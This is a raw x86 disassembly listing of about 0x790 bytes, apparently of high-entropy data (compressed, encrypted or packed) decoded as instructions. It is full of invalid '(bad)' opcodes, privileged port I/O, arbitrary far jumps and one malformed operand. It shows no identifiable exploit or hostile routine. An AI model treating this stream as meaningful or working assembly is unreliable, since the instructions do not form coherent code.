  41e73d:	ficom  WORD PTR [eax+0x5f]
  41e740:	repnz shr BYTE PTR [edi],0x1d
  41e744:	dec    esp
  41e745:	xchg   BYTE PTR [esi-0x43],bl
  41e748:	(bad)  
  41e749:	sbb    ecx,DWORD PTR [ecx+edx*2+0x6675ca91]
  41e750:	int3   
  41e751:	sti    
  41e752:	in     al,0x4c
  41e754:	stos   DWORD PTR es:[edi],eax
  41e755:	rol    DWORD PTR [esi],cl
  41e757:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e758:	pop    es
  41e759:	push   es
  41e75a:	mov    bh,0xa2
  41e75c:	in     eax,dx
  41e75d:	out    0xa6,eax
  41e75f:	stos   DWORD PTR es:[edi],eax
  41e760:	cs jmp 0xb475:0xc9207321
  41e768:	(bad)  
  41e769:	mov    edi,0x2ed5978a
  41e76e:	mov    edx,0xa4fca26f
  41e773:	into   
  41e774:	cmp    eax,0xcab9008e
  41e779:	jp     0x41e76c
  41e77b:	je     0x41e76e
  41e77d:	and    ch,dh
  41e77f:	mov    WORD PTR [ebx-0x70],cs
  41e782:	ror    DWORD PTR [ebx-0x79f28dda],cl
  41e788:	push   ecx
  41e789:	shl    DWORD PTR [eax-0x7d],0x55
  41e78d:	fild   WORD PTR [ecx-0x126a7f7d]
  41e793:	aam    0xf4
  41e795:	xor    al,0x3a
  41e797:	lds    esi,FWORD PTR [eax]
  41e799:	imul   ecx,DWORD PTR [ebx+eax*1],0xba236555
  41e7a0:	mov    ah,0xc2
  41e7a2:	xchg   esp,eax
  41e7a3:	jp     0x41e776
  41e7a5:	push   esi
  41e7a6:	cmp    dh,dl
  41e7a8:	sub    cl,cl
  41e7aa:	pop    ecx
  41e7ab:	xchg   edx,eax
  41e7ac:	cmp    al,0x68
  41e7ae:	mov    esi,0x2aa2b081
  41e7b3:	push   ebp
  41e7b4:	push   esp
  41e7b5:	sahf   
  41e7b6:	and    BYTE PTR [edx+0x69],ch
  41e7b9:	ret    
  41e7ba:	es cli 
  41e7bc:	adc    edx,ecx
  41e7be:	call   0xa88:0x5ba63d99
  41e7c5:	in     eax,dx
  41e7c6:	gs out 0xc8,al
  41e7c9:	fs fs icebp 
  41e7cc:	leave  
  41e7cd:	fmulp  st(4),st
  41e7cf:	inc    esp
  41e7d0:	mov    edi,0xa13770cb
  41e7d5:	cld    
  41e7d6:	or     BYTE PTR [ebx+0x13fee29f],ch
  41e7dc:	repz arpl WORD PTR [edi-0x18],cx
  41e7e0:	sub    BYTE PTR [esi+ebp*4],0xe6
  41e7e4:	adc    eax,0x6a222fc3
  41e7e9:	pop    esi
  41e7ea:	aaa    
  41e7eb:	out    dx,al
  41e7ec:	adc    al,0xd9
  41e7ee:	add    al,0x72
  41e7f0:	cs out 0x83,eax
  41e7f3:	cwde   
  41e7f4:	mov    edx,0xb0f45279
  41e7f9:	in     al,0x48
  41e7fb:	adc    DWORD PTR [eax],ebp
  41e7fd:	into   
  41e7fe:	pop    eax
  41e7ff:	(bad)  
  41e800:	cdq    
  41e801:	ret    0x5fd1
  41e804:	iret   
  41e805:	jmp    0xba80:0x5789acf3
  41e80c:	dec    eax
  41e80d:	cdq    
  41e80e:	imul   edx,DWORD PTR [ecx],0x1110e86d
  41e814:	xor    ebp,eax
  41e816:	mov    ds:0xf5ea750c,al
  41e81b:	lods   al,BYTE PTR ds:[esi]
  41e81c:	ja     0x41e893
  41e81e:	add    al,0x6d
  41e820:	scas   al,BYTE PTR es:[di]
  41e822:	xor    eax,0x9984c66b
  41e827:	icebp  
  41e828:	cdq    
  41e829:	dec    edx
  41e82a:	test   al,0x3
  41e82c:	fld    st(1)
  41e82e:	sub    bh,cl
  41e830:	fiadd  DWORD PTR [eax]
  41e832:	add    al,0xa0
  41e834:	dec    eax
  41e835:	in     al,dx
  41e836:	and    si,WORD PTR [eax]
  41e839:	fidiv  WORD PTR [ecx]
  41e83b:	retf   
  41e83c:	cmp    al,0x18
  41e83e:	ins    DWORD PTR es:[edi],dx
  41e83f:	adc    al,0xce
  41e841:	data16 mov dh,0x52
  41e844:	xchg   ebx,eax
  41e845:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e846:	lock lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e849:	sti    
  41e84a:	xor    al,BYTE PTR [edi+0x4f7a3939]
  41e850:	test   dl,al
  41e852:	push   ss
  41e853:	imul   edx,ebx,0x9cd253b2
  41e859:	dec    ebx
  41e85a:	xchg   ebx,eax
  41e85b:	scas   al,BYTE PTR es:[edi]
  41e85c:	push   esi
  41e85d:	mov    ebp,0x3c5d1f22
  41e862:	int    0xcb
  41e864:	out    dx,al
  41e865:	mov    ch,0x7c
  41e867:	sub    edx,edi
  41e869:	lods   eax,DWORD PTR ds:[esi]
  41e86a:	into   
  41e86b:	adc    BYTE PTR [ecx+0x3],cl
  41e86e:	mov    ch,0x44
  41e870:	test   DWORD PTR [edx-0x34],0xe661a564
  41e877:	outs   dx,BYTE PTR ds:[esi]
  41e878:	push   ds
  41e879:	shl    BYTE PTR [ebx+esi*4],1
  41e87c:	push   eax
  41e87d:	cdq    
  41e87e:	jl     0x41e8a4
  41e880:	fldcw  WORD PTR [eax]
  41e882:	jecxz  0x41e80a
  41e884:	pop    esp
  41e885:	hlt    
  41e886:	dec    esi
  41e887:	mov    bl,0x38
  41e889:	not    DWORD PTR fs:[eax]
  41e88c:	dec    ebx
  41e88d:	sbb    DWORD PTR [ecx],edx
  41e88f:	pushf  
  41e890:	(bad)  [ebx+0x60]
  41e893:	shr    DWORD PTR [esi+ecx*4+0x7f],1
  41e897:	mov    eax,ds:0x232c6ee7
  41e89c:	aad    0x7a
  41e89e:	aaa    
  41e89f:	test   al,0xac
  41e8a1:	fdivrp st(2),st
  41e8a3:	xor    bh,BYTE PTR [eax]
  41e8a5:	xchg   ecx,eax
  41e8a6:	jmp    0x41e876
  41e8a8:	test   BYTE PTR [edx+0x2bbd9c44],ch
  41e8ae:	loope  0x41e87d
  41e8b0:	pop    ebp
  41e8b1:	ret    0x4f1b
  41e8b4:	mov    ebx,0xc0d921f3
  41e8b9:	jb     0x41e86a
  41e8bb:	or     eax,0x98284d29
  41e8c0:	js     0x41e8a1
  41e8c2:	dec    esp
  41e8c3:	adc    ecx,ebp
  41e8c5:	dec    eax
  41e8c6:	sbb    BYTE PTR gs:[ecx],dh
  41e8c9:	adc    al,0x9
  41e8cb:	arpl   WORD PTR [ebx+0x1d2a488c],ax
  41e8d1:	mov    esp,0xceb3a474
  41e8d7:	sbb    ecx,esi
  41e8d9:	loopne 0x41e8d1
  41e8db:	push   edi
  41e8dc:	mov    al,0x4e
  41e8de:	and    esp,DWORD PTR [ebx+ebx*2+0x77c1f45]
  41e8e5:	(bad)  
  41e8e6:	mov    bh,0xa7
  41e8e8:	pop    ebp
  41e8e9:	pushf  
  41e8ea:	and    al,0xae
  41e8ec:	es daa 
  41e8ee:	ret    
  41e8ef:	jno    0x41e8dd
  41e8f1:	mov    ds:0x1a1e8940,eax
  41e8f6:	cmp    eax,0x261f219c
  41e8fb:	data16 cmp ah,BYTE PTR [esi-0xc]
  41e8ff:	(bad)  
  41e900:	xchg   edx,eax
  41e901:	ficom  WORD PTR ds:0xbb890c93
  41e907:	cmp    bl,BYTE PTR [eax]
  41e909:	push   ebx
  41e90a:	mov    al,0x41
  41e90c:	sub    bl,BYTE PTR [ebp+esi*1-0x2f681b16]
  41e913:	xor    BYTE PTR [eax],al
  41e915:	cmp    eax,0x94db7891
  41e91a:	sbb    eax,0x72285350
  41e91f:	push   ebx
  41e920:	cmc    
  41e921:	or     DWORD PTR [ecx],0xffffff8d
  41e924:	lock out 0x8,al
  41e927:	fwait
  41e928:	jge    0x41e999
  41e92a:	xchg   esp,eax
  41e92b:	mov    ?,WORD PTR [eax-0x79]
  41e92e:	dec    edi
  41e92f:	push   esi
  41e930:	call   0x28c9:0x62c9d8ee
  41e937:	repz out 0xf4,al
  41e93a:	mov    esi,0x14c79ab8
  41e93f:	inc    esi
  41e940:	sub    eax,0xa61ea3d0
  41e945:	mov    edx,ebx
  41e947:	sub    eax,0xfcf750cf
  41e94c:	cli    
  41e94d:	adc    BYTE PTR [ebx-0x16],0x84
  41e951:	push   ebp
  41e952:	imul   ebp,ebp,0x3f
  41e955:	repnz ftst 
  41e958:	push   ds
  41e959:	or     al,0x7
  41e95b:	xlat   BYTE PTR ds:[ebx]
  41e95c:	dec    esi
  41e95d:	add    al,0x8c
  41e95f:	lds    ebp,FWORD PTR [ebx]
  41e961:	push   eax
  41e962:	xchg   ebx,eax
  41e963:	and    al,0x15
  41e965:	cdq    
  41e966:	cmp    BYTE PTR [ecx+0x7f883948],al
  41e96c:	outs   dx,BYTE PTR ds:[esi]
  41e96d:	in     eax,dx
  41e96e:	imul   esp,esp,0x49
  41e971:	xor    al,0x9d
  41e973:	xchg   esi,esp
  41e975:	inc    ebx
  41e976:	out    dx,eax
  41e977:	inc    BYTE PTR [esi+0x5e]
  41e97a:	jo     0x41e952
  41e97c:	jmp    0x41e9f4
  41e97e:	adc    DWORD PTR [esp+eiz*2-0x29],edi
  41e982:	or     ebx,esp
  41e984:	jae    0x41e9d9
  41e986:	popa   
  41e987:	jns    0x41e9af
  41e989:	test   BYTE PTR [edi],al
  41e98b:	ss jno 0x41ea06
  41e98e:	dec    ebp
  41e98f:	loopne 0x41e924
  41e991:	add    dl,BYTE PTR [edx-0x53]
  41e994:	mov    esp,0x954681af
  41e999:	lahf   
  41e99a:	les    ebx,FWORD PTR [esi+esi*8+0x14140607]
  41e9a1:	lds    edi,FWORD PTR [ebp-0x390dddd7]
  41e9a7:	pop    ebp
  41e9a8:	fsubr  DWORD PTR [ebp-0x1278eab]
  41e9ae:	adc    BYTE PTR [eax],bh
  41e9b0:	cmc    
  41e9b1:	dec    eax
  41e9b2:	dec    ebp
  41e9b3:	sbb    al,0x79
  41e9b5:	mov    esp,0x836cd909
  41e9ba:	sbb    eax,0xcef59e3f
  41e9bf:	or     BYTE PTR [edx-0x66019bde],ah
  41e9c5:	adc    eax,0xc7809568
  41e9ca:	jno    0x41e94e
  41e9cc:	andps  xmm2,XMMWORD PTR [edx]
  41e9cf:	das    
  41e9d0:	fiadd  WORD PTR [edi-0x7b330401]
  41e9d6:	adc    eax,ecx
  41e9d8:	stos   DWORD PTR es:[edi],eax
  41e9d9:	sub    eax,0xbb16889b
  41e9de:	test   BYTE PTR [esi-0x7e8864f6],dh
  41e9e4:	sub    eax,0x23e12829
  41e9e9:	mov    dl,0x79
  41e9eb:	ins    BYTE PTR es:[edi],dx
  41e9ec:	mov    BYTE PTR [ebx],dh
  41e9ee:	inc    edx
  41e9ef:	mov    BYTE PTR [ebx-0x80],bh
  41e9f2:	retf   0xc56a
  41e9f5:	ins    BYTE PTR es:[edi],dx
  41e9f6:	jle    0x41ea77
  41e9f8:	(bad)  
  41e9f9:	push   cs
  41e9fa:	call   0x7d2cbb3f
  41e9ff:	mov    gs:0x3964abb8,eax
  41ea05:	jae    0x41e9b0
  41ea07:	jl     0x41ea82
  41ea09:	test   BYTE PTR ds:0x5c060615,0x99
  41ea10:	xor    al,0xae
  41ea12:	hlt    
  41ea13:	sub    ebp,edi
  41ea15:	je     0x41ea94
  41ea17:	push   edi
  41ea18:	mov    esp,0xdb370377
  41ea1d:	jmp    0x7588:0x48d25ce6
  41ea24:	mov    esi,0x203a4011
  41ea29:	dec    esp
  41ea2a:	xor    al,0xef
  41ea2c:	enter  0xeb20,0x75
  41ea30:	(bad)  
  41ea32:	xchg   edx,eax
  41ea33:	into   
  41ea34:	jmp    0x41ea77
  41ea36:	arpl   ax,ax
  41ea38:	jp     0x41eaad
  41ea3a:	sti    
  41ea3b:	xchg   DWORD PTR [ecx+ecx*4+0x6b4997ca],esi
  41ea42:	fsub   DWORD PTR ds:0x41af9294
  41ea48:	mov    di,bx
  41ea4b:	or     ebp,edi
  41ea4d:	cli    
  41ea4e:	nop
  41ea4f:	fmul   QWORD PTR [ebp-0xc4df5c5]
  41ea55:	call   0xb1f50863
  41ea5a:	pusha  
  41ea5b:	cmp    DWORD PTR [esi],0x21ecbeef
  41ea61:	mov    eax,0x833d9889
  41ea66:	inc    ebx
  41ea67:	xor    eax,DWORD PTR [ebx-0x27]
  41ea6a:	xlat   BYTE PTR ds:[ebx]
  41ea6b:	jle    0x41ea39
  41ea6d:	dec    edi
  41ea6e:	or     DWORD PTR [esi+0x44],0xffffffdd
  41ea72:	fsub   st,st(1)
  41ea74:	stc    
  41ea75:	sub    al,0x11
  41ea77:	ror    ecx,0x57
  41ea7a:	mov    dh,0x5d
  41ea7c:	ss call 0xea378e1
  41ea82:	sub    edx,DWORD PTR [ecx+0x7f]
  41ea85:	jmp    0xf33d:0x2a4a93b2
  41ea8c:	test   eax,0xef6f85eb
  41ea91:	mov    esp,0x85b12b3b
  41ea96:	fs inc ebp
  41ea98:	sub    BYTE PTR [ebx-0x11],0x16
  41ea9c:	sub    BYTE PTR [ebx],dh
  41ea9e:	mov    al,ds:0x98ab2fc8
  41eaa3:	inc    edx
  41eaa4:	jmp    0x15e:0x15c69269
  41eaab:	mov    dh,0xf7
  41eaad:	xchg   edi,eax
  41eaae:	ja     0x41ea5a
  41eab0:	and    eax,ebp
  41eab2:	outs   dx,DWORD PTR ds:[esi]
  41eab3:	out    0xe3,al
  41eab5:	fs mov ebp,edi
  41eab8:	(bad)  
  41eab9:	in     eax,0x76
  41eabb:	cld    
  41eabc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eabd:	test   al,0x22
  41eac0:	push   ecx
  41eac1:	addr16 hlt 
  41eac3:	add    BYTE PTR [edx-0x3d],ch
  41eac6:	(bad)  
  41eac7:	lahf   
  41eac8:	pop    ebx
  41eac9:	dec    ebp
  41eacb:	jl     0x41ea5f
  41eacd:	xor    esp,DWORD PTR [edi+0x3c]
  41ead0:	hlt    
  41ead1:	jmp    0x41eb25
  41ead3:	jne    0x41ea5e
  41ead5:	xor    BYTE PTR [edi+0x38bb76b8],cl
  41eadb:	imul   DWORD PTR [esi+esi*4-0x62b1c9bd]
  41eae2:	imul   ebp,DWORD PTR [edx+0x685f8760],0x74
  41eae9:	(bad)  
  41eaea:	aas    
  41eaeb:	out    dx,al
  41eaec:	cdq    
  41eaed:	hlt    
  41eaee:	bound  edx,QWORD PTR [ebx-0x2bef56cf]
  41eaf4:	inc    ebp
  41eaf5:	or     al,bh
  41eaf7:	out    0x50,eax
  41eaf9:	js     0x41eafb
  41eafb:	pop    eax
  41eafc:	mov    dl,0x4e
  41eafe:	cmovle edx,DWORD PTR [eax+0x2c]
  41eb02:	jmp    0xea69:0xc57ee307
  41eb09:	or     BYTE PTR [ebp+0x6da56d1b],al
  41eb0f:	iret   
  41eb10:	and    al,0xfc
  41eb12:	loopne 0x41eb11
  41eb14:	adc    BYTE PTR [edi+0x5f721962],dl
  41eb1a:	cmp    BYTE PTR [eax],0xd9
  41eb1d:	add    esp,DWORD PTR [ebp-0x6d6fd79d]
  41eb23:	add    esp,DWORD PTR [edx]
  41eb25:	hlt    
  41eb26:	test   al,0x89
  41eb28:	pop    esi
  41eb29:	add    ecx,edi
  41eb2b:	pop    es
  41eb2c:	mov    ds:0x6f6f33e9,al
  41eb31:	jl     0x41eb54
  41eb33:	push   ebx
  41eb34:	push   ebp
  41eb35:	mov    edx,0x47c29407
  41eb3a:	push   edx
  41eb3b:	test   BYTE PTR [esi-0x6a],cl
  41eb3e:	or     eax,0x614c8a15
  41eb43:	clc    
  41eb44:	mov    ecx,0x9f4e943c
  41eb49:	xchg   ebp,eax
  41eb4a:	call   0xc4450f9f
  41eb4f:	in     eax,0x27
  41eb51:	sbb    al,BYTE PTR [edi]
  41eb53:	daa    
  41eb54:	mov    WORD PTR [edi+esi*8],gs
  41eb57:	lea    eax,[ebx+0x12369057]
  41eb5d:	adc    eax,DWORD PTR [edx-0x2d]
  41eb60:	mov    DWORD PTR [edi-0x1054e588],esi
  41eb66:	push   0x9fa9fe53
  41eb6b:	xchg   esp,eax
  41eb6c:	xchg   edx,eax
  41eb6d:	sub    BYTE PTR [edi],dh
  41eb6f:	ror    DWORD PTR [ebx-0x32],cl
  41eb72:	and    BYTE PTR [ebx+eiz*4+0x3],0x6c
  41eb77:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb78:	mov    al,0x68
  41eb7a:	call   0xdab471b7
  41eb7f:	loope  0x41ebf8
  41eb81:	out    0x75,eax
  41eb83:	out    dx,al
  41eb84:	or     bh,BYTE PTR [ecx+0x45]
  41eb87:	mov    esi,0xec77dd46
  41eb8c:	lea    edx,[esi-0x47e198a4]
  41eb92:	inc    esp
  41eb93:	ror    ebx,1
  41eb95:	xchg   DWORD PTR [esi-0x3a],ebp
  41eb98:	mov    esi,0xb973b6c4
  41eb9d:	popa   
  41eb9e:	xor    BYTE PTR [esi+0x4f7ee04f],dh
  41eba4:	dec    esp
  41eba5:	popa   
  41eba6:	sub    BYTE PTR [edx+0x5c],0x12
  41ebaa:	or     bl,BYTE PTR [edx+0x7ed752f0]
  41ebb0:	loope  0x41eb58
  41ebb2:	xchg   edi,eax
  41ebb3:	rcl    BYTE PTR [ebx],0xbe
  41ebb6:	(bad)  
  41ebb7:	ds mov ebp,0xeb44730d
  41ebbd:	rcl    eax,1
  41ebbf:	push   esi
  41ebc0:	test   dl,cl
  41ebc2:	dec    esp
  41ebc3:	lods   al,BYTE PTR ds:[esi]
  41ebc4:	adc    DWORD PTR [ecx-0x51],edx
  41ebc7:	add    BYTE PTR [ecx],dl
  41ebc9:	and    BYTE PTR [ecx],0xdf
  41ebcc:	adc    DWORD PTR [edi+0x73],esi
  41ebcf:	sar    DWORD PTR [edx-0x18],cl
  41ebd2:	aam    0x6
  41ebd4:	and    BYTE PTR [edx+eax*2-0x7f50aa51],bl
  41ebdb:	scas   al,BYTE PTR es:[edi]
  41ebdc:	xchg   esi,eax
  41ebdd:	mov    dh,0x95
  41ebdf:	or     esi,DWORD PTR [esi-0x4e5cefc3]
  41ebe5:	push   es
  41ebe6:	sbb    bh,bl
  41ebe8:	pusha  
  41ebe9:	xor    ebx,ecx
  41ebeb:	dec    edx
  41ebec:	jge    0x41ec2a
  41ebee:	cmc    
  41ebef:	push   edx
  41ebf0:	into   
  41ebf1:	jb     0x41ebd7
  41ebf3:	popf   
  41ebf4:	je     0x41ebb4
  41ebf6:	into   
  41ebf7:	xor    eax,0xe7839ab8
  41ebfc:	jno    0x41ec7b
  41ebfe:	mov    eax,0xa231ab3a
  41ec03:	push   es
  41ec04:	call   0x24bc7cb8
  41ec09:	jle    0x41ec26
  41ec0b:	pusha  
  41ec0c:	shl    BYTE PTR [esi+0x356a2381],1
  41ec12:	fs xchg edi,eax
  41ec14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec15:	mov    WORD PTR [ecx+edx*4],gs
  41ec18:	mov    ds:0x7f468cff,al
  41ec1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec1e:	loop   0x41ec39
  41ec20:	cmc    
  41ec21:	xchg   esp,eax
  41ec22:	fstp   DWORD PTR [ecx]
  41ec24:	adc    al,0x4b
  41ec26:	ss fcmovbe st,st(6)
  41ec29:	jmp    0x2143:0x8cd2b14f
  41ec30:	jae    0x41ebf5
  41ec32:	sbb    dh,BYTE PTR ds:0x446a2452
  41ec38:	cmp    BYTE PTR [edx],cl
  41ec3a:	inc    ebp
  41ec3b:	push   edx
  41ec3c:	and    al,0xc5
  41ec3e:	loopne 0x41ec47
  41ec40:	xor    edx,ebx
  41ec42:	jne    0x41ebf4
  41ec44:	(bad)  
  41ec45:	jnp    0x41ec32
  41ec47:	data16 mov dh,0xe
  41ec4a:	xchg   edx,eax
  41ec4b:	add    esp,DWORD PTR [ebx]
  41ec4d:	clc    
  41ec4e:	fwait
  41ec4f:	mov    ch,0x3f
  41ec51:	lods   eax,DWORD PTR ds:[esi]
  41ec52:	sbb    eax,0xf78ea3c2
  41ec57:	add    eax,0xd2e426e7
  41ec5c:	xor    ebx,ecx
  41ec5e:	dec    ebp
  41ec5f:	jbe    0x41ec96
  41ec61:	jge    0x41ec0e
  41ec63:	cs call 0x53ef5e68
  41ec69:	fbstp  TBYTE PTR [ecx+ebp*1+0x3ac487c4]
  41ec70:	adc    ebx,esi
  41ec72:	dec    esp
  41ec73:	or     eax,edi
  41ec75:	xor    ah,BYTE PTR [edx-0x6593c26b]
  41ec7b:	scas   al,BYTE PTR es:[edi]
  41ec7c:	js     0x41ec2d
  41ec7e:	rol    bh,1
  41ec80:	inc    ecx
  41ec81:	xchg   esp,eax
  41ec82:	pop    ecx
  41ec83:	inc    edi
  41ec84:	icebp  
  41ec85:	mov    WORD PTR [edi+0x3f713e9b],es
  41ec8b:	cmp    BYTE PTR [eax+0x39a79ace],ah
  41ec91:	sub    BYTE PTR [eax-0x4],bl
  41ec94:	sub    al,0x12
  41ec96:	cmp    BYTE PTR [esi+0x71],al
  41ec99:	jae    0x41ec20
  41ec9b:	dec    BYTE PTR ds:0xca77d54f
  41eca1:	enter  0xfb8d,0x95
  41eca5:	imul   edi,DWORD PTR [ebx-0x7766f1cd],0xfee5c745
  41ecaf:	pop    ds
  41ecb0:	dec    esp
  41ecb1:	int3   
  41ecb2:	xchg   ecx,eax
  41ecb3:	jbe    0x41ecc8
  41ecb5:	icebp  
  41ecb6:	in     eax,0xc8
  41ecb8:	nop
  41ecb9:	fcomp  st(5)
  41ecbb:	mov    eax,ebx
  41ecbd:	sbb    ebx,0xffffffb7
  41ecc0:	xchg   ebp,eax
  41ecc1:	gs aaa 
  41ecc3:	push   cs
  41ecc4:	mov    ds:0x89e69eeb,al
  41ecc9:	push   ds
  41ecca:	mov    esp,0xde113016
  41eccf:	repnz shl BYTE PTR ds:0x34ff1c13,0x9b
  41ecd7:	inc    ebp
  41ecd8:	push   ebp
  41ecd9:	ror    BYTE PTR [edi+ebp*4],0x94
  41ecdd:	cmp    DWORD PTR [ecx-0x54e52660],ebx
  41ece3:	mov    al,0x3c
  41ece5:	scas   al,BYTE PTR es:[edi]
  41ece6:	push   es
  41ece7:	cdq    
  41ece8:	pop    es
  41ece9:	lods   eax,DWORD PTR ds:[esi]
  41ecea:	and    bl,BYTE PTR [edx-0x4]
  41eced:	mov    DWORD PTR [edx-0x438f3d75],eax
  41ecf3:	adc    edx,DWORD PTR [ebx-0x3d597300]
  41ecf9:	dec    ecx
  41ecfa:	(bad)  
  41ecfb:	bnd jle 0x41ed3d
  41ecfe:	jmp    0x41ed46
  41ed00:	jle    0x41ecf4
  41ed02:	xchg   esp,eax
  41ed03:	jg     0x41ec87
  41ed05:	outs   dx,DWORD PTR ds:[esi]
  41ed06:	lds    edx,FWORD PTR [edx+0x5c]
  41ed09:	dec    edx
  41ed0a:	mov    BYTE PTR [ecx+ecx*2+0x11b6ab37],bl
  41ed11:	mov    BYTE PTR [eax-0x31605d44],bh
  41ed17:	push   es
  41ed18:	mov    ds:0x1fb3c560,al
  41ed1d:	add    ebp,DWORD PTR [ecx+esi*1+0x25]
  41ed21:	(bad)  
  41ed22:	aad    0x21
  41ed24:	and    eax,0xf36f3e7f
  41ed29:	sbb    ah,bl
  41ed2b:	pop    esi
  41ed2c:	xor    edi,DWORD PTR [ecx-0x26c2aa9e]
  41ed32:	test   DWORD PTR [esi+edi*2-0xd7473a6],ebx
  41ed39:	cld    
  41ed3a:	sub    eax,0x9b04208a
  41ed3f:	jmp    0x9ebe:0xe2ef3e9e
  41ed46:	inc    eax
  41ed47:	sub    BYTE PTR [esi-0x12],bh
  41ed4a:	sbb    bh,ch
  41ed4c:	loop   0x41ed81
  41ed4e:	jmp    0x41edce
  41ed50:	pop    eax
  41ed51:	(bad)  [ebp+0xd]
  41ed54:	push   ecx
  41ed55:	stos   DWORD PTR es:[edi],eax
  41ed56:	jbe    0x41ed2f
  41ed58:	repnz or DWORD PTR [ecx],eax
  41ed5b:	bound  esi,QWORD PTR ds:0x79179616
  41ed61:	scas   al,BYTE PTR es:[edi]
  41ed62:	xor    ch,BYTE PTR [eax]
  41ed64:	sub    BYTE PTR [edx-0x41],ah
  41ed67:	fwait
  41ed68:	sub    dl,BYTE PTR [edx-0x67d383db]
  41ed6e:	cmp    al,0x12
  41ed70:	sar    BYTE PTR [ebx-0x1354e7c5],1
  41ed76:	adc    BYTE PTR ds:0x9174edd8,bh
  41ed7c:	cmp    DWORD PTR [ecx+0x383a595a],edx
  41ed82:	push   edi
  41ed83:	pop    ebx
  41ed84:	jo     0x41ed9a
  41ed86:	popa   
  41ed87:	imul   esp,DWORD PTR [esi],0xffffffd9
  41ed8a:	adc    eax,0xc51ffb1b
  41ed8f:	mov    edx,0xb80d023f
  41ed94:	pop    esp
  41ed95:	adc    al,0xfe
  41ed97:	dec    edi
  41ed98:	fcom   QWORD PTR [ecx-0x38]
  41ed9b:	out    dx,al
  41ed9c:	repz jl 0x41edd7
  41ed9f:	div    DWORD PTR [edx+0x12]
  41eda2:	push   edx
  41eda3:	cld    
  41eda4:	lods   al,BYTE PTR ds:[esi]
  41eda5:	jmp    0x663600ea
  41edaa:	dec    esi
  41edab:	jb     0x41ed9e
  41edad:	jae    0x41ed4b
  41edaf:	fidiv  WORD PTR [esi]
  41edb1:	inc    edi
  41edb2:	mov    al,ds:0xd92f0cf3
  41edb7:	retf   
  41edb8:	mov    bh,0x87
  41edba:	fstp   st(7)
  41edbc:	pop    ecx
  41edbd:	inc    ecx
  41edbe:	sti    
  41edbf:	mov    ds:0x34cd19e2,al
  41edc4:	cmp    dh,bh
  41edc6:	(bad)  
  41edc7:	xchg   ebp,eax
  41edc8:	out    0x46,eax
  41edca:	ret    0xcccb
  41edcd:	cmp    eax,0x44702e41
  41edd2:	out    0x24,al
  41edd4:	dec    esi
  41edd5:	mov    edx,0x95bf8aa4
  41edda:	jae    0x41ed68
  41eddc:	push   ss
  41eddd:	es jmp 0xea4750b8
  41ede3:	leave  
  41ede4:	in     eax,0x32
  41ede6:	icebp  
  41ede7:	xchg   edi,eax
  41ede8:	inc    eax
  41ede9:	sub    DWORD PTR [edx],0x30
  41edec:	xchg   BYTE PTR [edx-0x69],cl
  41edef:	rcr    BYTE PTR [esi-0x4defab33],cl
  41edf5:	add    BYTE PTR [ecx+0x3b],0xdb
  41edf9:	sub    eax,0xdc7fb84a
  41edfe:	fcomp  DWORD PTR ds:0x5428be51
  41ee04:	jo     0x41ee52
  41ee06:	jo     0x41eda8
  41ee08:	push   ss
  41ee09:	mov    cl,0x68
  41ee0b:	mov    ebp,0xb3698b06
  41ee10:	mov    dl,0xd7
  41ee12:	add    al,0x56
  41ee14:	aam    0xfd
  41ee16:	ds aaa 
  41ee18:	push   cs
  41ee19:	das    
  41ee1a:	xchg   esi,eax
  41ee1b:	xchg   DWORD PTR [ebx+ebx*8-0x46d934d6],ebp
  41ee22:	xchg   edx,eax
  41ee23:	xchg   esi,eax
  41ee24:	xchg   DWORD PTR [eax+0x77],esp
  41ee27:	mov    ecx,0xc14aede2
  41ee2c:	inc    ebx
  41ee2d:	sbb    DWORD PTR [ebx-0x2c7b1648],ecx
  41ee33:	and    dl,dh
  41ee35:	outs   dx,DWORD PTR ds:[esi]
  41ee36:	adc    ecx,DWORD PTR [bp+di+0x73]
  41ee3a:	dec    ecx
  41ee3b:	jbe    0x41ee94
  41ee3d:	in     al,0x30
  41ee3f:	xchg   esp,eax
  41ee40:	and    edx,DWORD PTR [ebx+0x3fe7d50c]
  41ee46:	outs   dx,DWORD PTR ds:[esi]
  41ee47:	rcl    DWORD PTR [esi+edx*1],0x7f
  41ee4b:	outs   dx,BYTE PTR ds:[esi]
  41ee4c:	repnz mov bl,BYTE PTR ds:0x7de0fb3b
  41ee53:	mov    dh,0xd8
  41ee55:	mov    bl,dh
  41ee57:	mov    dl,0x5b
  41ee59:	and    ebp,DWORD PTR [edi-0x627d4a4]
  41ee5f:	sub    BYTE PTR [ebp-0x52],0x8
  41ee63:	adc    eax,0xdf7b8a3e
  41ee68:	loop   0x41eebb
  41ee6a:	out    dx,al
  41ee6b:	fcomp  QWORD PTR [edx+0x3a8941c3]
  41ee71:	push   ebx
  41ee72:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee73:	std    
  41ee74:	sub    al,0x94
  41ee76:	fist   DWORD PTR [esi-0xe]
  41ee79:	or     BYTE PTR [ebx+0x5bb18f08],ah
  41ee7f:	int    0xd1
  41ee81:	ror    al,1
  41ee83:	mov    ebx,0x2d5651eb
  41ee88:	fidiv  WORD PTR [eax-0x54]
  41ee8b:	jp     0x41ee34
  41ee8d:	mov    edi,eax
  41ee8f:	or     edx,esi
  41ee91:	pop    ss
  41ee92:	stos   DWORD PTR es:[edi],eax
  41ee93:	sbb    BYTE PTR [ecx+0x2e67c7f8],bh
  41ee99:	mov    ch,0x5e
  41ee9b:	lods   eax,DWORD PTR ds:[esi]
  41ee9c:	sbb    BYTE PTR ss:[ecx],ch
  41ee9f:	or     dh,BYTE PTR [ebx-0x50ef042d]
  41eea5:	mov    ebp,0x847f3780
  41eeaa:	cmc    
  41eeab:	gs ret 
  41eead:	mov    ds:0xec753624,al
  41eeb2:	adc    bl,BYTE PTR [edi+0x65]
  41eeb5:	mov    edi,0xbc55ab8f
  41eeba:	mov    ch,0xa
  41eebc:	ja     0x41ee63
  41eebe:	adc    BYTE PTR [edx],0xe6
  41eec1:	(bad)  
  41eec2:	mov    esp,0x3a83eaf7
  41eec7:	sbb    ebp,ebx
  41eec9:	neg    BYTE PTR [ecx-0x40]
  41eecc:	sub    eax,0x9f3a6988
  41eed1:	jb     0x41eec2
